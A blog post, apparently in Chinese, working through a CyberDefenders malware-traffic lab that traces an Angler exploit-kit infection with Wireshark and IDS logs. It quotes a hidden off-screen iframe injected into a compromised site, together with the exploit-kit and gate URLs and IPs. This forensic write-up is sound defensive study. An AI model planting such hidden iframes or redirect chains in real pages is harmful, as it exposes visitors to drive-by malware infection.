<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Bantian">





<title>流量分析系列之Malware-Traffic-上 | Bantian</title>



    <link rel="icon" href="/my.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 4.2.1"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">流量分析系列之Malware-Traffic-上</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">2021-08-01&nbsp;&nbsp;12:53:57</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <blockquote>
<p>本文首发在安全客：<a href="https://www.anquanke.com/post/id/244154，分为两部分，本文为上" target="_blank" rel="noopener">https://www.anquanke.com/post/id/244154，分为两部分，本文为上</a></p>
</blockquote>
<h2 id="Malware-Traffic-Analysis-1"><a href="#Malware-Traffic-Analysis-1" class="headerlink" title="Malware Traffic Analysis-1"></a>Malware Traffic Analysis-1</h2><p>lab地址：<a href="https://cyberdefenders.org/labs/18" target="_blank" rel="noopener">https://cyberdefenders.org/labs/18</a></p>
<h3 id="练习场景"><a href="#练习场景" class="headerlink" title="练习场景"></a>练习场景</h3><p>故事是这样的，Tom和Jake是我们公司安全运行中心SOC的新员工。他们呢分别给自己去了花名为”Goofus”和”Gallant”，这两个花名都是来自某个儿童杂志中的漫画。Tom又叫做Goofus，Jake又叫做Gallant。</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/2015-11-24-traffic-analysis-exercise-image-01.jpg" alt="2015-11-24-traffic-analysis-exercise-image-01"></p>
<p>在感恩节前夕的周四，Tom和Jake正在SOC工作。Tom带了他自己的Windows笔记本来上班，他想用在上班的时候摸会儿鱼，冲下浪。Jake呢就是兢兢业业工作的老实人。</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/2015-11-24-traffic-analysis-exercise-image-02.jpg" alt="2015-11-24-traffic-analysis-exercise-image-02"></p>
<p>Jake的感恩节计划已经定下来了，他打算吃他前不久在超市里买的火鸡。相比起Jake，Tom是个火鸡狂热分子，他打算自己亲自去猎一只火鸡。为了打成他的感恩节计划，Tom打算买一杆shotgun。Tom在上网的时候连接了SOC中心的wifi，然后开始挑选他的shotgun。没玩一会儿，Tom的电脑就弹出了一些警报，不一会儿，电脑就直接蓝屏宕机了。。。</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/2015-11-24-traffic-analysis-exercise-image-03.jpg" alt="2015-11-24-traffic-analysis-exercise-image-03"></p>
<p>你呢，刚好负责培训这两个新人Goofus和Gallant。毫无疑问的是，Goofus Tom会因为他在上班事件摸鱼还感染了病毒被开除，而Gallant是个经验尚不足的新手，所以你需要帮助Tom找到他的电脑被感染的原因。</p>
<p>你检查了Tom的电脑，然后发现了一条可疑的注册表信息，和该注册表信息相关的文件的SHA256值为： <strong><em>d16ad130daed5d4f3a7368ce73b87a8f84404873cbfc90cc77e967a83c947cd2</em></strong> 。</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/2015-11-24-traffic-analysis-exercise-image-04.jpg" alt="2015-11-24-traffic-analysis-exercise-image-04"></p>
<p>随后，你查看了网络alerts。遗憾的是，你司没啥钱配置商业的网络入侵检测系统（Intrusion Detection System，IDS），但幸运的是，低成本的解决方案是配置了的。你可以查看Snorts alerts和Suricata alerts来寻找蛛丝马迹。</p>
<p><strong>Snots：</strong></p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/2015-11-24-traffic-analysis-exercise-image-05.jpg" alt="2015-11-24-traffic-analysis-exercise-image-05"></p>
<p><strong>Suricata：</strong></p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/2015-11-24-traffic-analysis-exercise-image-06.jpg" alt="2015-11-24-traffic-analysis-exercise-image-06"></p>
<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>了解了背景之后，进入正题，下载题目提供的压缩包，解压后得到4个文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;c40-malware-traffic-analysis-4 </span><br><span class="line">╰─$ tree</span><br><span class="line">.</span><br><span class="line">├── malware-traffic-analysis-4.pcap</span><br><span class="line">├── malware-traffic-analysis-4-snort-events.txt</span><br><span class="line">└── malware-traffic-analysis-4-suricata-events.txt</span><br></pre></td></tr></table></figure>

<p>其中<code>malware-traffic-analysis-4-snort-events.txt</code>文件是<code>Snort</code>日志文件，<code>malware-traffic-analysis-4-suricata-events.txt</code>则是是Suricata日志文件。</p>
<h3 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem 1"></a>Problem 1</h3><blockquote>
<p>*<em>What is the victim IP address? *</em></p>
</blockquote>
<p>查看<code>malware-traffic-analysis-4-snort-events.txt</code>文件，发现了两条这样的记录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[**] [1:30320:2] BLACKLIST Connection to malware sinkhole [**]</span><br><span class="line">[Classification: A Network Trojan was detected] [Priority: 1] </span><br><span class="line">11&#x2F;24-16:16:42.076853 166.78.145.90:80 -&gt; 10.1.25.119:49453</span><br><span class="line">TCP TTL:128 TOS:0x0 ID:6775 IpLen:20 DgmLen:310 DF</span><br><span class="line">***A**** Seq: 0x76295D32  Ack: 0x7F847C95  Win: 0xFF00  TcpLen: 20</span><br><span class="line">[Xref &#x3D;&gt; http:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Sinkhole_Server]</span><br><span class="line"></span><br><span class="line">[**] [1:25018:3] BLACKLIST Connection to malware sinkhole [**]</span><br><span class="line">[Classification: A Network Trojan was detected] [Priority: 1] </span><br><span class="line">11&#x2F;24-16:16:42.076853 166.78.145.90:80 -&gt; 10.1.25.119:49453</span><br><span class="line">TCP TTL:128 TOS:0x0 ID:6775 IpLen:20 DgmLen:310 DF</span><br><span class="line">***A**** Seq: 0x76295D32  Ack: 0x7F847C95  Win: 0xFF00  TcpLen: 20</span><br><span class="line">[Xref &#x3D;&gt; http:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Sinkhole_Server]</span><br></pre></td></tr></table></figure>

<p>流量从主机<code>166.78.145.90</code>到主机<code>10.1.25.119</code>，由此可知，受害主机ip为<code>10.1.25.119</code>。</p>
<p>另一种方法，我们可以在wireshark中过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/23.png" alt="23"></p>
<p>过滤之后发现请求都是从ip为<code>10.1.25.119</code>的主机发出的，如果再过滤<code>http.response</code>，可以看到，http响应数据包的目的地地址都是<code>10.1.25.119</code>，因此可以判断受害主机IP为<code>10.1.25.119</code>。</p>
<h3 id="Problem-2"><a href="#Problem-2" class="headerlink" title="Problem 2"></a>Problem 2</h3><blockquote>
<p> *<em>What is the victim’s hostname? *</em></p>
</blockquote>
<p>识别主机名通常有两种方式：</p>
<ol>
<li>从DHCP流量中获取主机信息</li>
<li>从NBNS流量中获取主机信息</li>
</ol>
<p>DHCP流量数据包有助于我们识别连接网络的几乎所有类型计算机的主机；NBNS流量数据包则主要由微软Windows系统计算机或运行MacOS系统的主机生成。</p>
<p>过滤dhcp流量包：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/1.png" alt="1"></p>
<p>选择source ip为受害主机的dhcp流量包：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/3.png" alt="3"></p>
<p>得到主机名为<code>Turkey-Tom</code>。</p>
<p>不过受DHCP租期更新频率的影响，数据包中可能没有捕获到DHCP流量包。那我们可以使用NBNS流量来识别Windows系统主机或MacOS系统主机。</p>
<p>而且从题目场景中我们可以知道，受害者Tom使用的是一台Windows7的笔记本。所以我们可以用<code>nbns</code>来过滤数据包中的NBNS流量。</p>
<p>Source IP皆为受害主机IP，那选择第一条流量数据，可以看到主机名为<code>TURKEY-TOM</code>。</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/4.png" alt="4"></p>
<h3 id="Problem-3"><a href="#Problem-3" class="headerlink" title="Problem 3"></a>Problem 3</h3><blockquote>
<p>*<em>What is the exploit kit name? *</em></p>
</blockquote>
<p>为了找到恶意软件，我们可以从流量中提出可疑的文件，在wireshark中，选择<code>File-&gt;Export Objects</code>，提供了5种文件传输协议：</p>
<blockquote>
<ul>
<li>DICOM： Digital Imaging and Communications in Medicine，医学数字成像和通信协议，DICOM是基于TCP/IP的网络协议，通过DICOM将影像设备和存储管理设备连接起来。</li>
<li>HTTP： HyperText Transfer Protocol，超文本传输协议，不用多介绍，是基于TCP协议的应用程传输协议，简单来说就是客户端和服务端进行数据传输的一种规则。</li>
<li>IMF：Internet Messafe Format，互联网信息格式，是文本消息在互联网上传输的格式。</li>
<li>SMB：ServerMessage Block，信息器服务块，是微软和英特尔在1987年制定的协议，主要作为微软网络的通讯协议。</li>
<li>TFTP：Trivial File Transfer Protocal，简单文件传输协议，是TCP/IP协议簇中一个用来再客户机与服务器之间进行简单文件传输的协议，提供不复杂，开销不大的文件传输服务。</li>
</ul>
</blockquote>
<p>再选择<code>HTTP</code>，能够得到通过Http协议传输的文件。</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/5.png" alt="5"></p>
<p>有非常多的文件通过HTTP协议传输，比如图片（image/jpeg），js脚本文件（text/javascript），网页文件（text/html）等，然后选择Save All，将所有文件都保存下来，然后全部扔进 ClamAV 中进行扫描，扫描了了677个文件后，确实发现了恶意软件：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/6.png" alt="6"></p>
<p>选择<code>Anlysis</code>，我们可以看到可疑的文件是一个名为<code>who(2).olp%3fsave=&amp;effect=VFv9cHM&amp;you=LmzXy&amp;picture=J0sYyqN&amp;why=Dv0ZsHPosOWnZsEC9KJ9myAYKZSGT</code>的文件：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/7.png" alt="7"></p>
<p>在wireshark中可以看到，该文件是类型为<code>application\x-shockwave-flash</code>的swf文件：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/8.png" alt="8"></p>
<p>本小题中，exploit kit的名为<code>Angler</code>。</p>
<p>除了上面这种方法以外，还可以将pcap包上传到VirusTotal扫描：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/16.png" alt="16"></p>
<p>Snort和Suricata分别有47条和14条alters，查看详情：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/15.png" alt="15"></p>
<p>在Snorts警报中发现了Exploit-Kit Angler。</p>
<h3 id="Problem-4"><a href="#Problem-4" class="headerlink" title="Problem 4"></a>Problem 4</h3><blockquote>
<p>*<em>What is the IP address that served the exploit? *</em></p>
</blockquote>
<p>接下来我们需要找到exploit kit的来源ip。</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/9.png" alt="9"></p>
<p>根据wireshark过滤出的文件，我们很容易定位到该文件对应的请求，发现该文件传输是从主机<code>162.216.4.20</code>传送到受害主机上的，得到本题答案<code>162.216.4.20</code>。</p>
<p>出了这种方法以外，我们还可以从info信息中过滤。info列是没有filter选项的，它是wireshark根据网络包内容生成的概要信息。我们可以这样过滤，首先进行搜索，<code>Ctrl+f</code>，注意在前面的搜索类型中修改为<code>String</code>，然后我们搜索关键词，比如<code>who.olp</code>：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/10.png" alt="10"></p>
<p>我们得到这样一条信息，受害主机<code>10.1.25.119</code>向主机<code>162.216.4.20</code>发送请求，对应的请求URI为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;neuhaus-hourakus.avelinoortiz.com&#x2F;who.olp?save&#x3D;&amp;effect&#x3D;VFv9cHM&amp;you&#x3D;LmzXy&amp;picture&#x3D;J0sYyqN&amp;why&#x3D;Dv0ZsHPosOWnZsEC9KJ9myAYKZSGT</span><br></pre></td></tr></table></figure>

<p>在该条流量的不远处，能找到来自主机<code>162.216.4.20</code>的响应：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/11.png" alt="11"></p>
<p>packet num 10960的数据包是受害主机向<code>162.216.4.20</code>发起请求，packet num为11089的数据包是主机<code>162.216.4.20</code>返回恶意软件给受害主机<code>10.1.25.119</code>。</p>
<h3 id="Problem-5"><a href="#Problem-5" class="headerlink" title="Problem 5"></a>Problem 5</h3><blockquote>
<p>*<em>What is the HTTP header that is used to indicate the flash version? *</em></p>
</blockquote>
<p>从上题分析中我们已经知道，packet num 11089，恶意软件所在主机返回封装在swf文件中的恶意软件给受害者，所以这个flash version也应当与该包相关，查看该数据包：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/13.png" alt="13"></p>
<p>追踪该数据包的HTTP流，右键<code>Follow-&gt;HTTP Stream</code>，根据上图的关键词定位到该数据包：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/14.png" alt="14"></p>
<p>该响应数据包对应的请求包中，可以看到与flash version相关的请求头为<code>x-flash-version</code>。</p>
<h3 id="Problem-6"><a href="#Problem-6" class="headerlink" title="Problem 6"></a>Problem 6</h3><blockquote>
<p>*<em>What is the malicious URL that redirects to the server serving the exploit? *</em></p>
</blockquote>
<p>这个问题是，Tom访问Exploit Kit的主机地址时，是从哪个URL跳转过去的？</p>
<p>在这里我们需要先了解一下，用户一般是怎么被Exploit-Kit（后面简称EK）感染的。</p>
<p>Exploit-Ki通常被攻击者利用用来感染受害用户，可能在用户浏览网站的时候，在不知不觉间，就被EK感染。EK通常托管在专用于提供EK的服务器上。而用户如何访问到这些EK？通常是通过被感染的网站发生的。攻击者首先攻击感染合法网站，向这些被感染的网站页面注入恶意脚本，这些脚本能将用户导到提供EK的服务器上。当然这些都是在用户不知情的情况下发生的。</p>
<p>在最简单的场景下，攻击链一般是这样的：</p>
<blockquote>
<p><strong><em>Compromised(legitimate) website –&gt; EK server</em></strong></p>
</blockquote>
<p>除了这种最简单的情况，很多时候，攻击者还会使用另一台服务器作为被感染的站点和EK服务器之间的gate。我们通常将这种情况称为<strong>redirect</strong>，因为它将流量从一个被感染的主机重定向到了EK服务器，当存在一个gate服务器的时候，攻击链是这样的：</p>
<blockquote>
<p><strong><em>Compromised website –&gt; Gate –&gt; EK</em></strong></p>
</blockquote>
<p>这个gate服务器通常是另一个被感染的website。当然，也有少数情况下，这个gate是攻击者自己搭建的专用服务器。在某些情况下，在到达EK之前，可能还存在2个或是3个gate：</p>
<blockquote>
<p><strong><em>Compromised website –&gt; First gate –&gt; Second gate –&gt; EK</em></strong></p>
</blockquote>
<p>好了，回到这个流量包本身，我们需要回答的问题是，受害者Tom是如何访问到EK服务器<code>162.216.4.20</code>的？</p>
<p>无非是两种情况：第一种，Tom访问了受感染的网站，然后受感染的网站利用脚本将Tom导向EK站点；第二种，Tom访问了受感染的网站，然后通过一个或多个gate，将Tom导向EK站点。</p>
<p>现在我们已经知道的是IP为<code>162.216.4.20</code>的站点，对应的domain为<code>neuhaus-hourakus.avelinoortiz.com</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request and ip.addr eq 162.216.4.20</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/17.png" alt="17"></p>
<p>我们搜索与该域名相关的流量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip contains neuhaus-hourakus.avelinoortiz.com</span><br></pre></td></tr></table></figure>

<p>按照时间排序，我们注意到一条流量是从<code>85.143.220.17</code>到受害主机的，这看起来像是一条gate相关的流量：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/18.png" alt="18"></p>
<p>我们跟踪该条流量的TCP流，右键<code>Follow-&gt;TCP Stream</code>：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/19.png" alt="19"></p>
<p>从这条流量得知，Tom访问了IP为<code>85.143.220.17</code>（域名为<code>solution.babyboomershopping.org</code>）的站点，访问的URL为<code>http://solution.babyboomershopping.org/respondents/header.js</code>，该站点中存在一个iframe页面，该页面嵌入了EK server的URL，使得Tom在不知情的情况下被EK server上的Exploit-Kit Angler感染。</p>
<p>所以，本题的答案为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;solution.babyboomershopping.org&#x2F;respondents&#x2F;header.js</span><br></pre></td></tr></table></figure>

<h3 id="Problem-7"><a href="#Problem-7" class="headerlink" title="Problem 7"></a>Problem 7</h3><blockquote>
<p>*<em>What is The CAPEC ID corresponding to the technique used to redirect the victim to the exploit server? More info at capec.mitre.org *</em></p>
</blockquote>
<p>本题的问题是，攻击者是用什么技术将受害用户重定向到EK服务器的，它的CAPEC ID是什么？</p>
<p>经过Problem 6的分析，我们已经知道，攻击者在受害者访问的页面中嵌入了一个iframe，该iframe的参数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe style&#x3D;&quot;position:absolute;left:-3311px;top:-3861px;width:309px;height:326px;&quot; src&#x3D;&quot;http:&#x2F;&#x2F;neuhaus-hourakus.avelinoortiz.com&#x2F;forums&#x2F;viewforum.php?f&#x3D;15&amp;sid&#x3D;0l.h8f0o304g67j7zl29&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<p>因为其位置参数设置得很夸张，所以用户根本察觉不到存在frame劫持的情况。</p>
<p>不过，本题问题的求的是CAPEC ID，是一种漏洞标准，全称为Common Attack Pattern Enumeration and Classification，即<strong>常见攻击模式枚举和分类</strong>。</p>
<p>所以，本题的答案为<code>CAPEC-222</code>，对应的attack pattern即为<code>iFrame Overlay</code>，属于点击劫持的一种分类。更加具体的细节可以参考：<a href="https://capec.mitre.org/data/definitions/222.html" target="_blank" rel="noopener">https://capec.mitre.org/data/definitions/222.html</a> 。</p>
<h3 id="Problem-8"><a href="#Problem-8" class="headerlink" title="Problem 8"></a>Problem 8</h3><blockquote>
<p> *<em>What is the FQDN of the compromised website? *</em></p>
</blockquote>
<p>本题的问题是，受感染的网站的完全限定域名是什么？</p>
<p>到目前为止，我们还没有找到Tom上网时感染的源头是什么，他到底访问了什么站点导致他的主机被感染？</p>
<p>我们继续过滤，看看什么流量中包含gate站点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip contains solution.babyboomershopping.org</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/20.png" alt="20"></p>
<p>在一条从IP <code>64.34.173.208</code>到受害主机<code>10.1.25.119</code>的流量中，包含<code>solution.babyboomershopping.org</code>，跟踪该条TCP流：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/21.png" alt="21"></p>
<p>由此我们得知，本题的答案，compromised website的完全限定域名为<code>shotgunworld.com</code>。攻击者采用了相同的frame劫持的方法，通过iframe将受害者重定向至gate站点<code>solution.babyboomershopping.org</code>，通过这个中间站点再将用户重定向至EK服务器。所以整条attack链为：</p>
<blockquote>
<p><strong><em>shotgunworld.com –&gt; solution.babyboomershopping.org –&gt; EK server</em></strong></p>
</blockquote>
<h3 id="Problem-9"><a href="#Problem-9" class="headerlink" title="Problem 9"></a>Problem 9</h3><blockquote>
<p>*<em>The compromised website contains a malicious js that redirect the user to another website. What is the variable name passed to the “document.write” function? *</em></p>
<p>Hint：OX_</p>
</blockquote>
<p>这道题的答案很简单，从上题追踪到的TCP Stream知道，iframe是当页面加载的时候，执行js，然后将iframe写入页面的：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis1/imgs/22.png" alt="22"></p>
<p>所以本题的答案为<code>OX_7f561e63</code>。</p>
<p>该流量包的分析就暂时到此为止了。</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Bantian</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>早睡早起身体好</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Malware-Traffic/"># Malware Traffic</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2021/08/01/MalwareTrafficAnalysis2/">流量分析系列之Malware-Traffic-下</a>
            
            
            <a class="next" rel="next" href="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">HackTheBox-Dyplesher靶机学习笔记</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
